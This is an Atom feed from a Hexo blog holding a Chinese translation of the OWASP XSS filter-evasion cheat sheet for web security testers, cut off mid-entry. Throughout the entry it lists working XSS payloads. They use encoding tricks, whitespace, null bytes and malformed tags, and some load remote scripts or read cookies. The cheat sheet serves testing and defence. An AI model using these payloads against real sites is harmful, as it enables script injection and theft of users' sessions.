<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wywwzjj&#39;s Blog</title>
  
  <subtitle>爱学习，爱分享，爱生活</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://wywwzjj.top/"/>
  <updated>2019-03-05T00:23:22.380Z</updated>
  <id>https://wywwzjj.top/</id>
  
  <author>
    <name>wywwzjj</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>xss bypass 备忘录</title>
    <link href="https://wywwzjj.top/2019/03/04/xss-bypass-%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>https://wywwzjj.top/2019/03/04/xss-bypass-备忘录/</id>
    <published>2019-03-04T01:23:29.000Z</published>
    <updated>2019-03-05T00:23:22.380Z</updated>
    
    <content type="html"><![CDATA[<p><img src="img/xss-dog.jpg" alt="img"></p><center><em>Xss Bypass备忘录</em></center><center>技术要发展,免不了风波.</center><center>也许这些攻攻防防会更好的促进技术的发展也说不定</center><center>就让这一次次的爆破换来将来更精练的技术的无比的宁静吧</center><center>我们静观其变吧！</center><center>缅怀当初那份最纯真Hacker精神!!<br><center>2017.深圳</center><center>By:Legend</center><h2 id="译文源起"><a href="#译文源起" class="headerlink" title="译文源起"></a>译文源起</h2><p>翻译本文最初源自国内在对2014年老道翻译的一个版本，发现此版本有些翻译个人认为不太满意，在加上2017年国庆长假漫漫，无人陪伴（主要还是约妹子没约出来！）。所以才对此进行翻译工作，希望对国内各位安全爱好者们有一定帮助吧。请允许译者用自己对此文档见解取一个中文名字—<strong>XSS BYPASS备忘录</strong>。文中所有代码参考OWASP官方复制，同时对于官方文档里面有些描述不太清楚地方译者通过自己对XSS理解加入一些自己见解，来帮助各位对XSS理解更上一个台阶。然后如文档之前说带上一个妹子名字。她说名字不让说，那么咱们姑且叫她小星星吧，翻译版权归她所有。对于翻译难免存在错误。请各位看官见谅！</p><p>翻译官方修订的版本：10/2/2017</p><p>关于译者：ID太多自己都忘记叫那个比较合适，就叫笑摸二楼狗头吧！</p><h2 id="译者说明"><a href="#译者说明" class="headerlink" title="译者说明"></a>译者说明</h2><p>译者为legend,当然也有人叫我小黑.或者…名字这些都不重要.本文部分章节采用了, OWASP Cheat Sheet Series翻译项目, XSS过滤绕过备忘单<a href="#_ftn1">[1]</a>部分小段,大概位于”URL字符串绕过”章节特此说明.因为译者认为他们翻译比我更为通顺.其他部分皆为译者结合全文与相关资料而编写,鄙人不认为说比老道版本好多少或者差多少.每个读者感受不一样,我只能说对自己说:我已经尽力了.</p><p>如果有兴趣一起交流技术也欢迎联系我.作为一位安全圈萌新,还需要各位大佬带带,最后感谢自己的团队还有各位老铁们支持,如果没有你们意见或许就没有这份文档出现.关于如何联系我?</p><p>因上努力,果上随缘</p><p> <br></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>本文重点是为Web应用安全测试人员提供指导，以协助进行XSS安全测试。本文初始内容由于RSNake从他的开创性XSS备忘录捐赠给OWASP，该页面位于<a href="http://ha.ckers.org/xss.html" target="_blank" rel="noopener">http://ha.ckers.org/xss.html</a>。该网站现在重定向到这里<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a>。我们计划在这里对它进行维护和更新。同时<a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting" target="_blank" rel="noopener">XSS (Cross Site Scripting) Prevention Cheat Sheet</a>_Prevention_Cheat_Sheet)的第一个版本就是受到RSnake的XSS过滤绕过备忘录启发，所以我们要感谢他的灵感。我们希望创建简单，有效指南，开发人员可以遵循指南防止XSS攻击，而不是简单告诉开发人员构造可以防止在本备忘录中所有花哨技巧的程序，因此就有<a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting" target="_blank" rel="noopener">XSS (Cross Site Scripting) Prevention Cheat Sheet</a>_Prevention_Cheat_Sheet)等安全备忘录系列诞生。</p><p><br></p><h1 id="测试说明"><a href="#测试说明" class="headerlink" title="测试说明"></a>测试说明</h1><p>这个Bypass备忘录适用于已经了解XSS攻击基础的人群，同时又希望深入了解防护绕过的细微差别。</p><p>请注意，大多数这些XSS payload已经在列出浏览器中进行了测试。</p><p><br></p><h2 id="XSS漏洞挖掘"><a href="#XSS漏洞挖掘" class="headerlink" title="XSS漏洞挖掘"></a>XSS漏洞挖掘</h2><p>在大多数情况下，如果页面没有对XSS进行特别过滤情况下，在存在XSS地方将会弹出”XSS”一词。可以通过URL编码对整个payload进去编码。小技巧：如果想通过快速方法去判断一个页面是否存在XSS，通常只需要在<code>&lt;PLAINTEXT&gt;</code> 标签处注入你的 <code>payload</code>，看看是否被打乱就可以判断是否存在XSS漏洞了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";   alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--   &gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>"&gt;'&gt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">88</span>,<span class="number">83</span>,<span class="number">83</span>))</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure><p><br></p><h2 id="XSS漏洞挖掘2"><a href="#XSS漏洞挖掘2" class="headerlink" title="XSS漏洞挖掘2"></a>XSS漏洞挖掘2</h2><p>如果你没有足够的输入空间，去测试页面是否能执行javascript，则此payload是一个很不错的紧凑型的XSS检测代码。输入代码后，通过此查询页面源代码搜索XSS看他是否存在问题。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'';!--"<span class="tag">&lt;<span class="name">XSS</span>&gt;</span>=&amp;&#123;()&#125;</span><br></pre></td></tr></table></figure><p><br></p><h2 id="没有任何过滤的利用"><a href="#没有任何过滤的利用" class="headerlink" title="没有任何过滤的利用"></a>没有任何过滤的利用</h2><p>这是一个常规的XSS测试代码,也是最容易被拦截的,但是我建议先尝试(关于引号在任何浏览器中都不需要,所以这里省略);</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">http://demo.wywwzjj.top/public/xss.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   <br></p><h2 id="常见通用XSS绕过利用代码"><a href="#常见通用XSS绕过利用代码" class="headerlink" title="常见通用XSS绕过利用代码"></a>常见通用XSS绕过利用代码</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">'"&gt;&gt;<span class="tag">&lt;<span class="name">marquee</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">confirm(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span>"&gt;<span class="tag">&lt;/<span class="name">plaintext\</span>&gt;</span><span class="tag">&lt;/<span class="name">|\</span>&gt;</span><span class="tag">&lt;<span class="name">plaintext</span>/<span class="attr">onmouseover</span>=<span class="string">prompt(1)</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>@gmail.com<span class="tag">&lt;<span class="name">isindex</span>   <span class="attr">formaction</span>=<span class="string">javascript:alert(/XSS/)</span>   <span class="attr">type</span>=<span class="string">submit</span>&gt;</span>'--&gt;"&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>   </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"&gt;   </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">id</span>=<span class="string">"confirm&amp;lpar;1)"</span>/<span class="attr">alt</span>=<span class="string">"/"</span><span class="attr">src</span>=<span class="string">"/"</span><span class="attr">onerror</span>=<span class="string">eval(id)</span>&gt;</span>'"&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://www.shellypalmer.com/wp-content/images/2015/07/hacked.jpg"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><br></p><h2 id="利用image标签执行Java-Script命令"><a href="#利用image标签执行Java-Script命令" class="headerlink" title="利用image标签执行Java Script命令"></a>利用image标签执行Java Script命令</h2><p>利用image标签配合Javascript命令来实现XSS。（IE7.0浏览器不支持Java Script命令在image标签中触发XSS，但是在可以在其他标签中出发。下面例子仅展示一种，其他标签依旧同样可以。）<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>译者注:如文中所说,还有其他方法.此文档未列出了而已.这里译者简单罗列一下.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(String.fromCharCode(88,83,83))</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"URL"</span> <span class="attr">style</span>=<span class="string">'Xss:expression(alert(/xss/));'</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="对屏蔽引号和分号的绕过"><a href="#对屏蔽引号和分号的绕过" class="headerlink" title="对屏蔽引号和分号的绕过"></a>对屏蔽引号和分号的绕过</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br></pre></td></tr></table></figure><p><br></p><h2 id="敏感字符检测的绕过"><a href="#敏感字符检测的绕过" class="headerlink" title="敏感字符检测的绕过"></a>敏感字符检测的绕过</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">JaVaScRiPt:alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br></pre></td></tr></table></figure><p><br></p><h2 id="HTML实体转义"><a href="#HTML实体转义" class="headerlink" title="HTML实体转义"></a>HTML实体转义</h2><p>此样例中分号是必须要的。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(&amp;quot;XSS&amp;quot;)</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="利用反引号混淆绕过"><a href="#利用反引号混淆绕过" class="headerlink" title="利用反引号混淆绕过"></a>利用反引号混淆绕过</h2><p>如果你需要使用单双引号，但是又被过滤掉，可以使用 ` 来封装你的JavaScript字符串,这个也是很多XSS防护以及过滤器没有考虑到这个字符.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=`<span class="attr">javascript:alert</span>("<span class="attr">RSnake</span> <span class="attr">says</span>,'<span class="attr">XSS</span>'")`&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="标签的畸形用法"><a href="#标签的畸形用法" class="headerlink" title="\标签的畸形用法"></a>\<a>标签的畸形用法</a></h2><p>利用Href规定链接目标的特性,从而发起XSS攻击,此想法由David Corss 提出,并且在Chrome浏览器上得到验证.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">"alert(document.cookie)"</span>&gt;</span>xss link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>此外Chrome喜欢替你做引号补全,如果你遇到不能被执行的话.那么就直接跳过忽略他们即可.因为Chrome会修复你URL或者脚本中丢失的引号,并且将它们补全.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">alert(document.cookie)</span>&gt;</span>xss link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="标签的畸形用法-1"><a href="#标签的畸形用法-1" class="headerlink" title="\标签的畸形用法"></a>\<img>标签的畸形用法</h2><p>最早被Begeek发现(可谓短小而精悍的运行在任何浏览器上),这个XSS paylod依靠浏览器的渲染引擎解析IMG标签中的XSS payload,该标签必须在引号内运行.我认为这个最初为了纠正错误编码而出现的.这将意味着可以使用难以理解HTML标签去解析.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> """&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="actionscript">alert(<span class="string">"XSS"</span>)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>"&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="利用fromCharCode方法绕过引号限制"><a href="#利用fromCharCode方法绕过引号限制" class="headerlink" title="利用fromCharCode方法绕过引号限制"></a>利用fromCharCode方法绕过引号限制</h2><p>如果任何形式引号都被拦截的情况下，你可以使用fromCharCode()方法来创造你需要的XSS Payload.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(String.fromCharCode(88,83,83))</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="利用SRC默认属性绕过-SRC域检测限制"><a href="#利用SRC默认属性绕过-SRC域检测限制" class="headerlink" title="利用SRC默认属性绕过,SRC域检测限制"></a>利用SRC默认属性绕过,SRC域检测限制</h2><p>此方法将绕过大多SRC域过滤器,可以利用事件方法插入任意Java script脚本.此方法也同样适用于From,iframe,input,Embed等任何HTML标记类型元素,同时它还允许标记类型相关事件作为备选进行替换,例如onblur,onclick,在后面为你附近一份可用事件表.由于Abdullah Hussam提供. Abdulahhusam编辑.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">#</span> <span class="attr">onmouseover</span>=<span class="string">"alert('xxs')"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="将SRC默认值为空"><a href="#将SRC默认值为空" class="headerlink" title="将SRC默认值为空."></a>将SRC默认值为空.</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>= <span class="string">onmouseover</span>=<span class="string">"alert('xxs')"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><br></p><h2 id="完全不设置SRC属性"><a href="#完全不设置SRC属性" class="headerlink" title="完全不设置SRC属性"></a>完全不设置SRC属性</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">onmouseover</span>=<span class="string">"alert('xxs')"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><br></p><h2 id="基于erro事件触发"><a href="#基于erro事件触发" class="headerlink" title="基于erro事件触发"></a>基于erro事件触发</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">/</span> <span class="attr">onerror</span>=<span class="string">"alert(String.fromCharCode(88,83,83))"</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br></pre></td></tr></table></figure><p><br></p><h2 id="IMG-onerror-和-Java-script编码绕过"><a href="#IMG-onerror-和-Java-script编码绕过" class="headerlink" title="IMG onerror 和 Java script编码绕过"></a>IMG onerror 和 Java script编码绕过</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><br></p><h2 id="十进制在html代码中运用"><a href="#十进制在html代码中运用" class="headerlink" title="十进制在html代码中运用"></a>十进制在html代码中运用</h2><p>此示例所使用的XSS payload无法有些浏览器下使用.&lt;在Gecko引擎下IMG标签在firefox和Netscape 8.1+不起作用&gt;<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span>   <span class="attr">SRC</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;</span>   &amp;#<span class="attr">39</span>;&amp;#<span class="attr">88</span>;&amp;#<span class="attr">83</span>;&amp;#<span class="attr">83</span>;&amp;#<span class="attr">39</span>;&amp;#<span class="attr">41</span>;&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="十进制且不带分号在html代码中运用"><a href="#十进制且不带分号在html代码中运用" class="headerlink" title="十进制且不带分号在html代码中运用"></a>十进制且不带分号在html代码中运用</h2><p>编码绕过xss过滤器经常会用到”&#XX;”,但是大多数人不太知道编码限制最多允许7位字符.导致错误认为一个html编码需要用;去结束,那些对字符串解码也是同样,\$tmp_string =~ s/.<em>\&amp;#(\d+);.</em>/\$1/.(作者注:无意中发现)<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span>   <span class="attr">SRC</span>=<span class="string">&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;</span>   #<span class="attr">0000108</span>&amp;#<span class="attr">0000101</span>&amp;#<span class="attr">0000114</span>&amp;#<span class="attr">0000116</span>&amp;#<span class="attr">0000040</span>&amp;#<span class="attr">0000039</span>&amp;#<span class="attr">0000088</span>&amp;#<span class="attr">0000083</span>&amp;#<span class="attr">0000083</span>&amp;#<span class="attr">0000039</span>&amp;#<span class="attr">0000041</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="十六进制且不带分号在html代码中运用"><a href="#十六进制且不带分号在html代码中运用" class="headerlink" title="十六进制且不带分号在html代码中运用"></a>十六进制且不带分号在html代码中运用</h2><p>这也是针对上述字符串$tmp_string =~ s/.<em>\&amp;#(\d+);.</em>/$1/进行XSS攻击.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span>   <span class="attr">SRC</span>=<span class="string">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="使用TAB绕过"><a href="#使用TAB绕过" class="headerlink" title="使用TAB绕过"></a>使用TAB绕过</h2><p>用于绕过某些XSS防护.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"jav   ascript:alert('XSS');"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="对编码的TAB进行绕过"><a href="#对编码的TAB进行绕过" class="headerlink" title="对编码的TAB进行绕过"></a>对编码的TAB进行绕过</h2><p>使用TAB编码<a href="#_ftn3">[3]</a>这个来分解XSS.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span>   <span class="attr">SRC</span>=<span class="string">"jav&amp;#x09;ascript:alert('XSS');"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="利用换行符来拆解XSS"><a href="#利用换行符来拆解XSS" class="headerlink" title="利用换行符来拆解XSS"></a>利用换行符来拆解XSS</h2><p>一些人认为09-13(十进制)都可进行此类型攻击,其实非也.其实只有09(tab),10(换行)和13(回车)可以使用.查看ascii表,下面四个示例将展现此payload.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span>   <span class="attr">SRC</span>=<span class="string">"jav&amp;#x0A;ascript:alert('XSS');"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="利用回车编码去拆解XSS"><a href="#利用回车编码去拆解XSS" class="headerlink" title="利用回车编码去拆解XSS"></a>利用回车编码去拆解XSS</h2><p>注意:上面用这些字符串比规定的要长,因为0是可以被省略的.通常我们看到的过滤器绕过十六进制和十进制编码是两到三个字符.正确的应该是一到七个字符.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"jav&amp;#x0D;ascript:alert('XSS');"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="Null空字符分割javascript指令"><a href="#Null空字符分割javascript指令" class="headerlink" title="Null空字符分割javascript指令"></a>Null空字符分割javascript指令</h2><p>Null空字符也可以作为XSS payload.但是不能像上边那样.你需要直接写入到他们利用工具中例如burp,或者使用%00字在你的url字符串里.在opera的老板(大概7.11 on windows)对于173个char会受到影响.但是null char %00更有用,并帮助我们绕过某些真实的防护,类似示例中:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e 'print "<span class="tag">&lt;<span class="name">IMG</span>   <span class="attr">SRC</span>=<span class="string">java\0script:alert(\</span>"<span class="attr">XSS</span>\")&gt;</span>";' &gt; out</span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="利用图像元素中Javascript的空格来绕过"><a href="#利用图像元素中Javascript的空格来绕过" class="headerlink" title="利用图像元素中Javascript的空格来绕过"></a>利用图像元素中Javascript的空格来绕过</h2><p>XSS过滤匹配模式很多情况都没有考虑”Javascript:”中可能有存在空格的情况,因此否则无法渲染.但是这也是导致错误的假设,认为你不可以有引号和”Javascript:”关键字.实际上,你可以从十进制的%01~%32中得到任何字符;<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">" &amp;#14;  javascript:alert('XSS');"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="非字母非数字型XSS"><a href="#非字母非数字型XSS" class="headerlink" title="非字母非数字型XSS"></a>非字母非数字型XSS</h2><p>Firefox HTML解析器设定一个在html关键字中非字母非数字都不是有效的.因为这些字符会被视为空格或非有效的HTM标签.问题是一些XSS过滤器假设他们正在匹配关键字然后被空格拆解了.例如”&lt;SCRIPT\s” != “&lt;SCRIPT/XSS\s”:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>/<span class="attr">XSS</span>   <span class="attr">SRC</span>=<span class="string">"http://xss.rocks/xss.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后,基于上述相同想法,使用Ranke fuzzer进行拓展.Gecko渲染引擎允许字母,数字或者HTML封装字符(如引号,尖括号)之外字符位于事件处理和等号之间.从而绕过XSS过滤器.注意这也只是适用于重音符如下所示:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">BODY</span>   <span class="attr">onload</span>!#$%&amp;()*~+<span class="attr">-_.</span>,<span class="attr">:</span>;?@[/|\]^`=<span class="string">alert(</span>"<span class="attr">XSS</span>")&gt;</span></span><br></pre></td></tr></table></figure></p><p>根据Yair Amit提醒,IE和Gecko渲染引擎之间略有不同,只允许标签和参数之间没有空格和斜杠.如果系统不允许空格,这示例可能很有用.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>/<span class="attr">SRC</span>=<span class="string">"http://xss.rocks/xss.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="多重尖括号"><a href="#多重尖括号" class="headerlink" title="多重尖括号"></a>多重尖括号</h2><p>由Franz Sedlmaier提交,这个XSS paylod可以通过首先使用匹配”&lt;&gt;”的检测引擎,然后通过比较内部标签,而没有使用更加有效的方式(例如匹配整个字符串尖括号和相关标签).”//”注释在结尾的用于防止Javascrip错误.<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure></p><h2 id="没有标签绕过"><a href="#没有标签绕过" class="headerlink" title="没有标签绕过"></a>没有标签绕过</h2><p>在Gecko渲染引擎模式下firefox和netscape8.1中,实际上并不需要常规XSSpayload中的”&gt;”部分.firefox会为你非常体贴的安全闭合HTML标签,并且加入闭合标签!这不需要任何额外的HTML.你可以添加引号,如果需要的话.但通常并不是必须的,注意:我不清楚这个代码写入到html代码会闭合成什么样子.<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT   SRC=http://xss.rocks/xss.js?&lt; B &gt;</span><br></pre></td></tr></table></figure></p><h2 id="Script标签中协议解析绕过"><a href="#Script标签中协议解析绕过" class="headerlink" title="Script标签中协议解析绕过"></a>Script标签中协议解析绕过</h2><p>这个玩法由Łukasz Pilorz提出来的,并且Ozh’s基于上下文提出协议解析绕过方法.这个XSS payload运行在IE.Netscape在IE和opera渲染模式中,不需要考虑编码问题,因为浏览器在”.j”写法中,会自动识别<script>标签.这种方法非常有效在输入长度受到限制,时候来进行绕过.当然域名越短越好.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">//ha.ckers.org/.j</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure></p><h2 id="利用括号半开在HTML-JavaScript-进行XSS"><a href="#利用括号半开在HTML-JavaScript-进行XSS" class="headerlink" title="利用括号半开在HTML/JavaScript 进行XSS"></a>利用括号半开在HTML/JavaScript 进行XSS</h2><p>跟firefox不同,IE渲染引擎不会加入额外的数据在你页面上.但是它允许Javascript利用在<img>标签从而产生XSS payload.因为它不需要一个结束”&gt;”尖括号.你可以插入这个XSS向量在任何HTML标签后面.甚至可以不用”&gt;”来闭合标签.注意:这样确实会搞乱HTML,这取决于他下面的HTML.同时对于这种入侵检测系统(NIDS)正则匹配可以直接绕过,表达式为: /((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/ 因为它不需要”&gt;”结束闭合标签.它也是可以有效对抗真实XSS过滤器,我曾经用这种半开的<iframe>标签代替<img>标签去绕过过滤器.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span>   <span class="attr">SRC</span>=<span class="string">"javascript:alert('XSS')"</span></span></span><br></pre></td></tr></table></figure></p><h2 